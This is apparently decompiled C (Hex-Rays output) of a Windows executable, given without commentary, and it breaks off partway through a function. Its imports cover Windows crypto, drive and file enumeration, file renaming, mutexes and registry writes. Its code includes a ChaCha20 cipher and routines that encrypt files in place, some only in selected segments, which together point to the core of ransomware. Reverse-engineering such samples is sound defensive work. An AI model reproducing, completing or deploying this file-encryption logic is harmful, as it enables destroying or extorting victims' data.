/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <math.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int __fastcall sub_401000(int a1, __m128i *a2);
int __fastcall sub_4012B0(_DWORD *a1, unsigned __int8 *a2);
void __fastcall sub_4013F0(__m128i *a1, __m128i *a2, unsigned int a3);
int __fastcall sub_4015A0(HANDLE hFile, unsigned __int8 *a2, unsigned __int8 *a3);
int __fastcall sub_401840(HANDLE hFile, unsigned __int8 *a2, unsigned __int8 *a3);
// int __usercall sub_401A80@<eax>(HCRYPTKEY a1@<edx>, LPCWSTR lpFileName, unsigned __int8 *a3, unsigned __int8 *a4);
// int __usercall sub_401EE0@<eax>(int a1@<ebp>);
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
int __fastcall sub_4022C0(HCRYPTPROV a1, HCRYPTKEY a2, LPCWSTR lpFileName, int a4);
int __thiscall sub_402840(HCRYPTPROV *phProv); // idb
void __stdcall __noreturn StartAddress(char *lpThreadParameter);
void __thiscall sub_4029D0(void **Block);
int __thiscall sub_402A00(_DWORD *this);
int sub_402ACA();
int sub_402AD2();
int __cdecl UserMathErrorFunction();
int sub_403078();
void sub_403082();
char sub_40308E();
void *sub_4030B5();
void *sub_4030BB();
// int __scrt_initialize_default_local_stdio_options(void); weak
BOOL sub_4030DE();
void *sub_4030EA();
void *sub_4030F0();
LPTOP_LEVEL_EXCEPTION_FILTER sub_403289();
// LONG __stdcall __scrt_unhandled_exception_filter(struct _EXCEPTION_POINTERS *ExceptionInfo); idb
void sub_4032EB();
void sub_4032F3();
void __cdecl sub_40331F(); // idb
// __vcrt_bool __cdecl __vcrt_uninitialize(__vcrt_bool Terminating);
// void *__cdecl memset(void *, int Val, size_t Size);
// int __usercall sub_403D20@<eax>(int (*a1)(void)@<eax>);
// void *__cdecl calloc(size_t Count, size_t Size);
// errno_t __cdecl wcscat_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source);
// size_t __cdecl _msize(void *Block);
void __cdecl j___free_base(void *Block);
// errno_t __cdecl wcsncpy_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source, rsize_t MaxCount);
// errno_t __cdecl wcscpy_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source);
int sub_404827();
int __cdecl sub_40482D(int a1);
// _DWORD __stdcall unknown_libname_2(_DWORD); weak
int __cdecl sub_4048A5(int a1);
// int __cdecl unknown_libname_3(void *Block); idb
void *__cdecl sub_404DD9(void **a1);
void *__cdecl sub_404DF4(void **a1);
// int __dcrt_uninitialize_environments_nolock(void); weak
int __cdecl sub_40514D(int a1);
__int32 sub_40521B();
int sub_4052DA();
// int __cdecl _set_new_mode(int NewMode);
void *sub_40530F();
// _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_4053B7(int a1, int a2);
int __cdecl sub_4053DF(int a1, int a2);
int __cdecl sub_405668(_onexit_t Function); // idb
// int __cdecl _register_onexit_function(_onexit_table_t *Table, _onexit_t Function);
char sub_4056FC();
char sub_405728();
__vcrt_bool sub_40576D();
int __cdecl sub_405BCA(int a1);
// void __cdecl _invalid_parameter_noinfo();
// unsigned int *__cdecl __doserrno();
// int *__cdecl _errno();
char sub_405D39();
// void __cdecl _free_base(void *Block);
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_3518db117f0e7cdb002338c5d3c47b6c_,_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ &,_lambda_abdedf541bb04549bc734292b4a045d4_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_51b6e8b1eb166f2a3faf91f424b38130_,_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ &,_lambda_0b5a4a3e68152e1d9b943535f5f47bed_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_5b71d36f03204c0beab531769a5b5694_,_lambda_be2b3da3f62db62e9dad5dc70221a656_ &,_lambda_8f9ce462984622f9bf76b59e2aaaf805_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_9df27f884b057bc3edfc946cb5b7cf47_,_lambda_e69574bed617af4e071282c136b37893_ &,_lambda_cc0d902bcbbeb830f749456577db4721_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_405EC1(int a1, int a2);
int __cdecl sub_405EE9(int a1, int a2);
int __cdecl sub_405F11(int a1, int a2);
int __cdecl sub_405F39(int a1, int a2);
int __thiscall sub_40669C(_DWORD **this, void *Block);
// int unknown_libname_8(void); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_4067A6(int a1, int a2);
// int __acrt_update_thread_multibyte_data(void); weak
// int __acrt_update_thread_locale_data(void); weak
char *__cdecl sub_4081CE(void *Block, unsigned int a2, unsigned int a3);
int __cdecl sub_408316(int a1);
// _DWORD __stdcall __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_a048d3beccc847880fc8490e18b82769_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_f7496a158712204296dd6628a163878e_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_40841A(int a1, int a2);
struct __crt_locale_data *__cdecl sub_408C69(int a1, struct __crt_locale_data **a2);
void *__cdecl sub_408C96(int a1, void **a2);
// void *__cdecl _realloc_base(void *Block, size_t Size);
int sub_4097BB();
// _DWORD __cdecl common_flush_all(_DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_61cee617f5178ae960314fd4d05640a0_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_9cd88cf8ad10232537feb2133f08c833_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_409B89(int a1, int a2);
int sub_40A956();
// void __usercall sub_40ABF4(char a1@<ch>, int a2@<ebp>);
// int _ffexpm1(void); weak
// int isintTOS(void); weak
// _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_40B536(int a1, int a2);
int __cdecl sub_40B55E(int a1);
// BOOL __stdcall IsProcessorFeaturePresent(DWORD ProcessorFeature);

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *CryptImportKey)(HCRYPTPROV hProv, const BYTE *pbData, DWORD dwDataLen, HCRYPTKEY hPubKey, DWORD dwFlags, HCRYPTKEY *phKey);
// extern LSTATUS (__stdcall *RegSetValueExW)(HKEY hKey, LPCWSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern LSTATUS (__stdcall *RegOpenKeyExW)(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// extern BOOL (__stdcall *CryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);
// extern BOOL (__stdcall *CryptEncrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen, DWORD dwBufLen);
// extern BOOL (__stdcall *CryptGenRandom)(HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);
// extern BOOL (__stdcall *CryptAcquireContextW)(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// extern HANDLE (__stdcall *CreateMutexW)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCWSTR lpName);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern DWORD (__stdcall *GetLogicalDriveStringsW)(DWORD nBufferLength, LPWSTR lpBuffer);
// extern DWORD (__stdcall *GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern DWORD (__stdcall *WaitForMultipleObjects)(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern BOOL (__stdcall *MoveFileW)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern void (__stdcall __noreturn *ExitThread)(DWORD dwExitCode);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern void (__stdcall *GetNativeSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern void (__stdcall *DeleteCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern int (__stdcall *lstrcmpiW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern int (__stdcall *lstrcmpW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern BOOL (__stdcall *SetFilePointerEx)(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern void (__stdcall *InitializeCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// extern void (__stdcall *InitializeSListHead)(PSLIST_HEADER ListHead);
// extern HINSTANCE (__stdcall *ShellExecuteW)(HWND hwnd, LPCWSTR lpOperation, LPCWSTR lpFile, LPCWSTR lpParameters, LPCWSTR lpDirectory, INT nShowCmd);
// extern PWSTR (__stdcall *StrStrIW)(PCWSTR pszFirst, PCWSTR pszSrch);
int dword_41400C = 1; // weak
void *off_414578 = &unk_414358; // idb
wchar_t *off_414580 = L"         (((((                  H"; // weak
int dword_4146A0 = -2; // weak
BYTE pbData = 6u; // idb
union _SLIST_HEADER ListHead; // idb
_UNKNOWN unk_414CE8; // weak
_UNKNOWN unk_414CF0; // weak
int dword_414CF8; // weak
int dword_414DAC; // weak
void *dword_414FCC; // idb
void *dword_414FD0; // idb
int dword_414FDC; // weak
int dword_414FE4; // weak
int dword_414FE8; // weak
_UNKNOWN unk_414FEC; // weak
_onexit_table_t stru_414FF0; // idb
HANDLE hHeap; // idb
int dword_415260[128]; // weak
int dword_415460; // weak
struct __crt_locale_data *dword_415464; // idb
LPCWSTR lpData; // idb
HANDLE *Block; // idb
DWORD nCount; // idb
struct _RTL_CRITICAL_SECTION CriticalSection; // idb
int dword_4154C0; // weak
int dword_4154C4; // weak
__m128i stru_4154C8[4096]; // weak
__m128i stru_4254C8[4096]; // weak
__m128i stru_4354C8[4096]; // weak
__m128i stru_4454C8[4096]; // weak
_UNKNOWN unk_4554CC; // weak
_UNKNOWN unk_4554D0; // weak
int dword_4554D8; // weak


//----- (00401000) --------------------------------------------------------
int __fastcall sub_401000(int a1, __m128i *a2)
{
  __m128i v2; // xmm0
  __int32 v3; // edi
  __int32 v4; // ebx
  __int32 v5; // ecx
  __int32 v6; // eax
  __int32 v7; // eax
  int v8; // edx
  int v9; // esi
  int v10; // edx
  int v11; // esi
  int v12; // edx
  int v13; // esi
  int v14; // edi
  int v15; // ebx
  int v16; // edx
  int v17; // esi
  int v18; // ebx
  int v19; // ecx
  int v20; // esi
  int v21; // ecx
  int v22; // edi
  int v23; // ecx
  int v24; // ebx
  int v25; // ecx
  int v26; // ebx
  bool v27; // zf
  int v28; // esi
  int result; // eax
  __int8 v30; // cl
  __int32 v31; // edx
  int v34; // [esp+10h] [ebp-7Ch]
  int v35; // [esp+14h] [ebp-78h]
  int v36; // [esp+18h] [ebp-74h]
  int v37; // [esp+1Ch] [ebp-70h]
  int v38; // [esp+20h] [ebp-6Ch]
  int v39; // [esp+24h] [ebp-68h]
  int v40; // [esp+28h] [ebp-64h]
  __m128i v41; // [esp+2Ch] [ebp-60h]
  __m128i v42; // [esp+3Ch] [ebp-50h]
  __m128i v43; // [esp+4Ch] [ebp-40h]
  __m128i v44; // [esp+5Ch] [ebp-30h]
  int v45; // [esp+6Ch] [ebp-20h]
  int v46; // [esp+70h] [ebp-1Ch]
  unsigned int v47; // [esp+74h] [ebp-18h]
  unsigned int v48; // [esp+78h] [ebp-14h]
  unsigned int v49; // [esp+7Ch] [ebp-10h]
  int v50; // [esp+80h] [ebp-Ch]
  int v51; // [esp+84h] [ebp-8h]
  unsigned int v52; // [esp+88h] [ebp-4h]

  v2 = *a2;
  v45 = 4;
  v41 = v2;
  v42 = a2[1];
  v3 = v42.m128i_i32[2];
  v43 = a2[2];
  v44 = a2[3];
  v4 = v44.m128i_i32[3];
  v5 = v44.m128i_i32[0];
  v49 = v44.m128i_u32[2];
  v51 = v44.m128i_i32[1];
  v50 = v42.m128i_i32[3];
  v48 = v42.m128i_u32[1];
  v6 = v42.m128i_i32[0];
  v52 = v42.m128i_i32[0];
  do
  {
    v7 = v41.m128i_i32[0] + v6;
    v8 = __ROL4__(v5 ^ v7, 16);
    v9 = __ROL4__(v52 ^ (v8 + v43.m128i_i32[0]), 12);
    v47 = v9 + v7;
    v46 = __ROL4__(v8 ^ (v9 + v7), 8);
    v38 = v8 + v43.m128i_i32[0] + v46;
    v36 = __ROL4__(v9 ^ v38, 7);
    v10 = __ROL4__(v51 ^ (v41.m128i_i32[1] + v48), 16);
    v11 = __ROL4__(v48 ^ (v10 + v43.m128i_i32[1]), 12);
    v51 = v11 + v41.m128i_i32[1] + v48;
    v39 = __ROL4__(v10 ^ v51, 8);
    v34 = v10 + v43.m128i_i32[1] + v39;
    v52 = __ROL4__(v11 ^ v34, 7);
    v12 = __ROL4__(v49 ^ (v3 + v41.m128i_i32[2]), 16);
    v13 = __ROL4__(v3 ^ (v12 + v43.m128i_i32[2]), 12);
    v40 = v13 + v3 + v41.m128i_i32[2];
    v35 = __ROL4__(v12 ^ v40, 8);
    v14 = v35 + v12 + v43.m128i_i32[2];
    v49 = __ROL4__(v13 ^ v14, 7);
    v15 = __ROL4__((v50 + v41.m128i_i32[3]) ^ v4, 16);
    v16 = __ROL4__(v50 ^ (v15 + v43.m128i_i32[3]), 12);
    v37 = v16 + v50 + v41.m128i_i32[3];
    v17 = __ROL4__(v15 ^ v37, 8);
    v18 = v17 + v15 + v43.m128i_i32[3];
    v50 = __ROL4__(v16 ^ v18, 7);
    v19 = __ROL4__(v17 ^ (v47 + v52), 16);
    v20 = __ROL4__(v52 ^ (v19 + v14), 12);
    v41.m128i_i32[0] = v20 + v47 + v52;
    v47 = __ROL4__(v19 ^ v41.m128i_i32[0], 8);
    v43.m128i_i32[2] = v19 + v14 + v47;
    v48 = __ROL4__(v20 ^ v43.m128i_i32[2], 7);
    v21 = __ROL4__(v46 ^ (v49 + v51), 16);
    v22 = __ROL4__(v49 ^ (v21 + v18), 12);
    v41.m128i_i32[1] = v22 + v49 + v51;
    v46 = __ROL4__(v21 ^ v41.m128i_i32[1], 8);
    v44.m128i_i32[0] = v46;
    v43.m128i_i32[3] = v21 + v18 + v46;
    v3 = __ROL4__(v43.m128i_i32[3] ^ v22, 7);
    v23 = __ROL4__(v39 ^ (v50 + v40), 16);
    v24 = __ROL4__(v50 ^ (v23 + v38), 12);
    v41.m128i_i32[2] = v24 + v50 + v40;
    v51 = __ROL4__(v23 ^ v41.m128i_i32[2], 8);
    v44.m128i_i32[1] = v51;
    v43.m128i_i32[0] = v23 + v38 + v51;
    v25 = __ROL4__(v35 ^ (v36 + v37), 16);
    v50 = __ROL4__(v43.m128i_i32[0] ^ v24, 7);
    v42.m128i_i32[3] = v50;
    v26 = __ROL4__(v36 ^ (v25 + v34), 12);
    v41.m128i_i32[3] = v26 + v36 + v37;
    v49 = __ROL4__(v25 ^ v41.m128i_i32[3], 8);
    v44.m128i_i64[1] = __PAIR64__(v47, v49);
    v43.m128i_i32[1] = v25 + v34 + v49;
    v52 = __ROL4__(v43.m128i_i32[1] ^ v26, 7);
    v42.m128i_i64[0] = __PAIR64__(v48, v52);
    v27 = v45-- == 1;
    v4 = v47;
    v6 = v52;
    v5 = v46;
  }
  while ( !v27 );
  v28 = 0;
  v42.m128i_i32[2] = v3;
  v41 = _mm_add_epi32(v41, *a2);
  v42 = _mm_add_epi32(a2[1], v42);
  v43 = _mm_add_epi32(a2[2], v43);
  result = a1 + 2;
  v44 = _mm_add_epi32(a2[3], v44);
  do
  {
    v30 = v41.m128i_i8[4 * v28];
    result += 4;
    v31 = v41.m128i_i32[v28++];
    *(_WORD *)(result - 6) = __PAIR16__(BYTE1(v31), v30);
    *(_BYTE *)(result - 4) = BYTE2(v31);
    *(_BYTE *)(result - 3) = HIBYTE(v31);
  }
  while ( v28 < 16 );
  return result;
}

//----- (004012B0) --------------------------------------------------------
int __fastcall sub_4012B0(_DWORD *a1, unsigned __int8 *a2)
{
  int result; // eax
  int v4; // ecx

  a1[4] = *a2 | ((a2[1] | (*((unsigned __int16 *)a2 + 1) << 8)) << 8);
  a1[5] = a2[4] | ((a2[5] | (*((unsigned __int16 *)a2 + 3) << 8)) << 8);
  a1[6] = a2[8] | ((a2[9] | (*((unsigned __int16 *)a2 + 5) << 8)) << 8);
  a1[7] = a2[12] | ((a2[13] | (*((unsigned __int16 *)a2 + 7) << 8)) << 8);
  a1[8] = a2[16] | ((a2[17] | (*((unsigned __int16 *)a2 + 9) << 8)) << 8);
  a1[9] = a2[20] | ((a2[21] | (*((unsigned __int16 *)a2 + 11) << 8)) << 8);
  a1[10] = a2[24] | ((a2[25] | (*((unsigned __int16 *)a2 + 13) << 8)) << 8);
  result = a2[28];
  v4 = result | ((a2[29] | (*((unsigned __int16 *)a2 + 15) << 8)) << 8);
  qmemcpy(a1, "expand 32-byte k", 16);
  a1[11] = v4;
  return result;
}

//----- (004013F0) --------------------------------------------------------
void __fastcall sub_4013F0(__m128i *a1, __m128i *a2, unsigned int a3)
{
  unsigned int v3; // edi
  __m128i *v4; // esi
  __int8 *v5; // ebx
  __m128i *v7; // eax
  int v8; // edx
  char v9; // cl
  __m128i v10; // xmm0
  unsigned int v11; // edx
  __m128i *v12; // eax
  __m128i v13; // xmm0
  __m128i v14; // xmm1
  __m128i *v15; // ecx
  unsigned int v16; // edi
  __int8 v17; // al
  unsigned int v18; // [esp+8h] [ebp-4Ch]
  unsigned int v19; // [esp+Ch] [ebp-48h] BYREF
  __m128i v20; // [esp+10h] [ebp-44h] BYREF
  __m128i v21[2]; // [esp+20h] [ebp-34h] BYREF
  __m128i v22; // [esp+40h] [ebp-14h] BYREF

  v3 = a3;
  v4 = a2;
  v19 = (unsigned int)a1;
  if ( a3 )
  {
    v5 = (__int8 *)((char *)&v20 - (char *)a2);
    while ( 1 )
    {
      sub_401000((int)&v20, a1);
      a1 = (__m128i *)v19;
      if ( (*(_DWORD *)(v19 + 48))++ == -1 )
        ++a1[3].m128i_i32[1];
      if ( v3 <= 0x40 )
        break;
      if ( v4 > (__m128i *)((char *)&v22.m128i_u64[1] + 7) || (__m128i *)((char *)&v4[3].m128i_u64[1] + 7) < &v20 )
      {
        v3 -= 64;
        *v4 = _mm_xor_si128(v20, *v4);
        v10 = v21[1];
        v4[1] = _mm_xor_si128(v21[0], v4[1]);
        v4[2] = _mm_xor_si128(v4[2], v10);
        v4[3] = _mm_xor_si128(v22, v4[3]);
        v4 += 4;
        v5 -= 64;
      }
      else
      {
        v7 = v4;
        v8 = 64;
        do
        {
          v9 = v7->m128i_i8[(_DWORD)v5];
          v7 = (__m128i *)((char *)v7 + 1);
          v7[-1].m128i_i8[15] ^= v9;
          --v8;
        }
        while ( v8 );
        a1 = (__m128i *)v19;
        v3 -= 64;
        v4 += 4;
        v5 -= 64;
      }
    }
    v11 = 0;
    if ( v3 )
    {
      if ( v3 < 0x40
        || v4 <= (__m128i *)((char *)&v19 + v3 + 3) && (__m128i *)((char *)&v4[-1].m128i_u64[1] + v3 + 7) >= &v20 )
      {
        goto LABEL_19;
      }
      v12 = v4 + 2;
      v19 = v3 & 0xFFFFFFC0;
      v18 = (char *)v21 - (char *)v4;
      do
      {
        v13 = v12[-2];
        v12 += 4;
        v12[-6] = _mm_xor_si128(*(__m128i *)((char *)&v20 + v11), v13);
        v14 = v21[v11 / 0x10];
        v11 += 64;
        v12[-5] = _mm_xor_si128(v14, v12[-5]);
        v12[-4] = _mm_xor_si128(*(__m128i *)((char *)&v12[-4] + (char *)&v20 - (char *)v4), v12[-4]);
        v12[-3] = _mm_xor_si128(*(__m128i *)((char *)&v12[-4] + (char *)v21 - (char *)v4), v12[-3]);
      }
      while ( v11 < (v3 & 0xFFFFFFC0) );
      v18 = v11;
      if ( v11 < v3 )
      {
LABEL_19:
        v15 = &v4[v11 / 0x10];
        v16 = v3 - v11;
        do
        {
          v17 = v15->m128i_i8[(char *)&v20 - (char *)v4];
          v15 = (__m128i *)((char *)v15 + 1);
          v15[-1].m128i_i8[15] ^= v17;
          --v16;
        }
        while ( v16 );
      }
    }
  }
}

//----- (004015A0) --------------------------------------------------------
int __fastcall sub_4015A0(HANDLE hFile, unsigned __int8 *a2, unsigned __int8 *a3)
{
  DWORD FileSize; // eax
  unsigned __int64 v4; // rax
  unsigned int v5; // edi
  __int64 v6; // rax
  int v7; // ecx
  int v8; // eax
  int v9; // ecx
  int v10; // eax
  void (__stdcall *v11)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD); // esi
  int v12; // edx
  BOOL (__stdcall *v13)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED); // eax
  unsigned int v14; // edi
  unsigned int v15; // esi
  LARGE_INTEGER v17; // [esp-10h] [ebp-9Ch]
  unsigned __int64 v18; // [esp-10h] [ebp-9Ch]
  LARGE_INTEGER v19; // [esp-10h] [ebp-9Ch]
  unsigned int v20; // [esp+10h] [ebp-7Ch]
  unsigned int v21; // [esp+14h] [ebp-78h]
  int v24; // [esp+2Ch] [ebp-60h]
  unsigned int v25; // [esp+30h] [ebp-5Ch]
  DWORD v26; // [esp+34h] [ebp-58h]
  int v27; // [esp+34h] [ebp-58h]
  __m128i v28[3]; // [esp+38h] [ebp-54h] BYREF
  int v29; // [esp+68h] [ebp-24h]
  int v30; // [esp+6Ch] [ebp-20h]
  int v31; // [esp+70h] [ebp-1Ch]
  int v32; // [esp+74h] [ebp-18h]
  DWORD NumberOfBytesWritten; // [esp+78h] [ebp-14h] BYREF
  DWORD FileSizeHigh; // [esp+7Ch] [ebp-10h] BYREF
  DWORD NumberOfBytesRead; // [esp+80h] [ebp-Ch] BYREF

  FileSizeHigh = 0;
  FileSize = GetFileSize(hFile, &FileSizeHigh);
  v26 = FileSize;
  v4 = (__int64)((double)__SPAIR64__(FileSizeHigh, FileSize) * 0.1623376623376623 / 3.0);
  v24 = HIDWORD(v4);
  v5 = HIDWORD(v4);
  v25 = v4;
  HIDWORD(v4) = v4 >> 31;
  v6 = (__int64)(__PAIR64__(FileSizeHigh, v26) - (__PAIR64__(v5, 2 * (int)v4) + v4)) / 2;
  v20 = HIDWORD(v6);
  v21 = v6;
  sub_4012B0(v28, a2);
  v7 = *((unsigned __int16 *)a3 + 1);
  v8 = a3[1];
  v29 = 0;
  v9 = *a3 | ((v8 | (v7 << 8)) << 8);
  v30 = 0;
  v10 = a3[6];
  v31 = v9;
  v11 = (void (__stdcall *)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))SetFilePointerEx;
  v32 = a3[4] | ((a3[5] | ((v10 | (a3[7] << 8)) << 8)) << 8);
  SetFilePointerEx(hFile, 0i64, 0, 0);
  v12 = 0;
  v27 = 0;
  while ( 1 )
  {
    v13 = ReadFile;
    if ( v12 == 2 )
      break;
    if ( v24 >= 0 && (v24 > 0 || v25 >= 0x10000) )
    {
      v14 = 0;
      v15 = 0;
      while ( v13(hFile, stru_4254C8, 0x10000u, &NumberOfBytesRead, 0) )
      {
        sub_4013F0(v28, stru_4254C8, NumberOfBytesRead);
        v17.HighPart = -(NumberOfBytesRead != 0);
        v17.LowPart = -NumberOfBytesRead;
        SetFilePointerEx(hFile, v17, 0, 1u);
        if ( !WriteFile(hFile, stru_4254C8, NumberOfBytesRead, &NumberOfBytesWritten, 0) )
          break;
        v14 = (__PAIR64__(v14, NumberOfBytesRead) + v15) >> 32;
        v15 += NumberOfBytesRead;
        v13 = ReadFile;
        if ( (int)((__PAIR64__(v14, v15) + 0x10000) >> 32) >= v24 )
          goto LABEL_12;
      }
      return -1;
    }
    v14 = 0;
    v15 = 0;
LABEL_12:
    v18 = __PAIR64__(v20, v21) + __PAIR64__(v14, v15) - __PAIR64__(v24, v25) + 0x10000;
    v11 = (void (__stdcall *)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))SetFilePointerEx;
    SetFilePointerEx(hFile, (LARGE_INTEGER)v18, 0, 1u);
    v12 = v27 + 1;
    v27 = v12;
    if ( v12 >= 3 )
      return 0;
  }
  while ( v13(hFile, stru_4254C8, 0x10000u, &NumberOfBytesRead, 0) )
  {
    sub_4013F0(v28, stru_4254C8, NumberOfBytesRead);
    v19.HighPart = -(NumberOfBytesRead != 0);
    v19.LowPart = -NumberOfBytesRead;
    v11(hFile, v19, 0, 1u);
    if ( !WriteFile(hFile, stru_4254C8, NumberOfBytesRead, &NumberOfBytesWritten, 0) )
      break;
    v13 = ReadFile;
    if ( NumberOfBytesRead < 0x10000 )
      return 0;
  }
  return -1;
}
// 4254C8: using guessed type __m128i stru_4254C8[4096];
// 4015A0: using guessed type __m128i var_54[3];

//----- (00401840) --------------------------------------------------------
int __fastcall sub_401840(HANDLE hFile, unsigned __int8 *a2, unsigned __int8 *a3)
{
  DWORD FileSize; // eax
  __int64 v6; // rax
  int v7; // ecx
  int v8; // eax
  int v9; // ecx
  int v10; // eax
  void (__stdcall *v11)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD); // esi
  int v12; // eax
  BOOL (__stdcall *v13)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED); // ecx
  __int64 v14; // rdi
  unsigned int v15; // eax
  unsigned int v16; // eax
  LARGE_INTEGER v18; // [esp-10h] [ebp-8Ch]
  LARGE_INTEGER v19; // [esp-10h] [ebp-8Ch]
  unsigned int v20; // [esp+18h] [ebp-64h]
  unsigned int v21; // [esp+1Ch] [ebp-60h]
  int liDistanceToMove_4; // [esp+24h] [ebp-58h]
  __m128i v23[3]; // [esp+28h] [ebp-54h] BYREF
  int v24; // [esp+58h] [ebp-24h]
  int v25; // [esp+5Ch] [ebp-20h]
  int v26; // [esp+60h] [ebp-1Ch]
  int v27; // [esp+64h] [ebp-18h]
  DWORD NumberOfBytesWritten; // [esp+68h] [ebp-14h] BYREF
  DWORD FileSizeHigh; // [esp+6Ch] [ebp-10h] BYREF
  DWORD NumberOfBytesRead; // [esp+70h] [ebp-Ch] BYREF

  FileSizeHigh = 0;
  FileSize = GetFileSize(hFile, &FileSizeHigh);
  v6 = (__int64)(__PAIR64__(FileSizeHigh, FileSize) - 110100480) / 2;
  v20 = HIDWORD(v6);
  v21 = v6;
  sub_4012B0(v23, a2);
  v7 = *((unsigned __int16 *)a3 + 1);
  v24 = 0;
  v8 = a3[1];
  v25 = 0;
  v9 = *a3 | ((v8 | (v7 << 8)) << 8);
  v10 = a3[6];
  v26 = v9;
